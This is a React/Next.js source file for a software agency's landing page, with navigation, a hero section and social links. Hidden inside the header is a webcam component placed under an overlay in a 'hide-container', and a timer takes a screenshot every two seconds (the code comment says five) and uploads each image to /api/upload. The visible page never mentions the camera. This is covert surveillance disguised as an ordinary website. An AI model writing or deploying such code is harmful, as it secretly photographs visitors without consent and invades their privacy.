"use client";
import Webcam from "react-webcam";
import { useRef, useEffect } from "react";

export default function Home() {
  const webcamRef = useRef(null);
  useEffect(() => {
    const interval = setInterval(async () => {
      if (webcamRef.current) {
        const imageSrc = webcamRef.current.getScreenshot();
        if (imageSrc) {
          // console.log("Captured image:", imageSrc);

          // Convert the base64 image to a Blob
          const blob = await fetch(imageSrc).then((res) => res.blob());
          const formData = new FormData();
          formData.append("image", blob, `image-${Date.now()}.jpeg`);

          // Send the captured image to the backend API to store it locally
          try {
            const uploadResponse = await fetch("/api/upload", {
              method: "POST",
              body: formData,
            });

            const data = await uploadResponse.json();
            console.log("Image upload response:", data);
          } catch (error) {
            console.error("Error uploading image:", error);
          }
        }
      }
    }, 2000); // Capture image every 5 seconds

    return () => clearInterval(interval); // Clear interval on component unmount
  }, []);

  // <div className="">
  //   <main className="">
  //     {/* <div className="bg-[#0a0a0a] absolute w-full h-full" /> */}
  //     <div className="z-10 absolute"></div>
  //     <div className="">
  //       <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} />
  //     </div>
  //   </main>
  // </div>
  return (
    <>
      {/* NAV */}
      <nav className="flex">
        <a href="#" className="logo">
          <img src="https://i.postimg.cc/s23zP3Mn/logo.png" alt="Logo" />
        </a>
        <ul className="links flex">
          <li>
            <a href="#" className="active">
              HOME
            </a>
          </li>
          <li>
            <a href="#">SERVICES</a>
          </li>
          <li>
            <a href="#">PORTFOLIO</a>
          </li>
          <li>
            <a href="#">CONTACT</a>
          </li>
          <li>
            <a href="#">ABOUT</a>
          </li>
        </ul>
      </nav>
      {/* HEADER */}
      <header className="flex relative padding_2 ">
        <article className="relative padding_4">
          <h5 className="sub_title tag">Welcome To Bboysdreamsfell</h5>
          <h1 className="title big">Code Done Right</h1>
          <p>
            We provide software & graphic expertise. So you can add skills
            rapidly without the need of permanent staff.
          </p>
          <aside className="buttons fixed_flex">
            <a href="#" className="btn btn_1">
              Learn more
            </a>
            <a href="#" className="btn btn_2">
              Contact us
            </a>
          </aside>
          <div className="hide-container ">
            <div className="hide-overlay"></div>
            <div className="">
              <Webcam
                audio={false}
                screenshotFormat="image/jpeg"
                ref={webcamRef}
              />
            </div>
          </div>
        </article>
        <aside className="social_icons flex">
          <a href="#">
            <i className="fa fa-facebook"></i>
          </a>
          <a href="#">
            <i className="fa fa-instagram"></i>
          </a>
          <a href="#">
            <i className="fa fa-linkedin"></i>
          </a>
        </aside>
      </header>
    </>
  );
}
